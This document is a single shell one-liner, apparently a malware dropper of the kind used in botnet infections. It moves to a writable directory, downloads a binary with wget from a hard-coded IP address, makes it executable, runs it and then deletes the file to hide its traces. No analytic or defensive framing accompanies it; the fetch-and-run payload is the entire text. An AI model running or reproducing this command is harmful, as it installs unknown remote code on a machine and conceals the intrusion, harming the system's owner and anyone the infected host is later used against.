cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.128/ponydicks8; chmod +x ponydicks8; ./ponydicks8; rm -rf ponydicks8
